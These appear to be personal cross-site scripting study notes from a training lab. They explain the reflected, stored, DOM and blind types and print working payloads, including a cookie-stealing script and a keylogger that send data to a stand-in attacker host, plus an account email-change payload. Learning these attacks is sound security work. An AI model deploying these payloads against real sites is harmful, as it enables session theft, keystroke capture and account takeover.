# XSS

## Payloads

Consists of two parts:

	- Intention. Part of the payload that actually does what we want it to do.
	- Modification. Part of the payload that changes the code.

Examples:

- Proof of concept:
~~~
<script>alert('XSS');</script>
~~~

- Session stealing (takes targets cookies, base64 encodes them and posts to hacker website.)

~~~
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
~~~

- Key logger (forwards key logs to website under hackers control)

~~~
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
~~~

- Bussiness Logic (often very specific. Calls javascript function to do something, case below )

~~~
<script>user.changeEmail('attacker@hacker.thm');</script>
~~~

## Types of XSS.

### Reflected.

Happens when user-supplied data in a HTTP request is reflected onto the web page without any validation.

Example:

A website returns an error message after incorrect input.

~~~
http://www.website.com/?error=Invalid Input

<div class="alert danger">
<p>Invalid Input</p?
</div>	
~~~

However this website doesn't check the contents of the error parameter then this can be changed to:

~~~
http://www.website.com/?error=<script src="http://evil.script.js"></script>

<div class="alert danger">
<p><script src="http://evil.script.js"></script></p>
</div>
~~~

Test for reflected xss:
	- Parameters in URL string
	- URL File path
	- HTTP headers (though rare)
	- check source code to see if parts of the url are reflected in the code.


### Stored XSS

XSS payload is stored on site and gets run everytime the webpage is loaded.

Example:

A website doesn't check user input in comments. The xss is stored in database and loaded everytime the webpage is loaded.

Test for stored xss:
	- Comments on blog
	- User profile information
	- Website listings.

### DOM XSS.

DOM is Document Object Model and is the programming interface for HTML/XML. Represents the page so that programmes can change the page document style/content etc.

DOM based XSS is where javascript execution happens directly in the browser without any new pages being loaded or data submitted to the backend.

Example:

A website gets the content from windows.location.hash parameter and writes onto current page. If the contents of the hash aren't checked then code can be injected.

Test for DOM XSS:
	- Look for code that an attacker can control over i.e "windows.location.x"
	- Check for eval() code


### Blind XSS

Similar to stored but is the payload is processed by the backend and can't be seen or tested for.

Example:

A website has a support form that doesn't check for XSS payloads. The message gets turned into a support ticket and can only be viewed by admins.

Test for blind xss:
	- Ensure payload has callback (i.e a http request)



## Perfecting payloads


Basic payload
~~~
<script>alert('hi')</script> 
~~~

Escape input tags
~~~
"><script>alert('hi')</script> 
~~~



